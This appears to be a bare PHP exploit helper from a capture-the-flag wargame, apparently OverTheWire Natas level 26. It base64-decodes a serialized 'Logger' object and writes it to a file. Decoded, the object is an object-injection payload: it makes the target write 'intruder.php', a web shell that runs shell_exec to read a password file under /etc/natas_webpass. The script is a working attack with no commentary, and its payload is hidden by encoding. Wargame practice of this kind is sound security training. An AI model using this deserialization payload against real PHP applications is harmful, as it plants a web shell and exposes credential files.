<?php
  $decoded = base64_decode("Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW50cnVkZXIucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTk6Ijw/cGhwIGVjaG8gc2hlbGxfZXhlYygnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+IjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTk6Ijw/cGhwIGVjaG8gc2hlbGxfZXhlYygnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9");
$fd = fopen("decoded", "a+");
fwrite($fd, $decoded);
fclose($fd);
?>
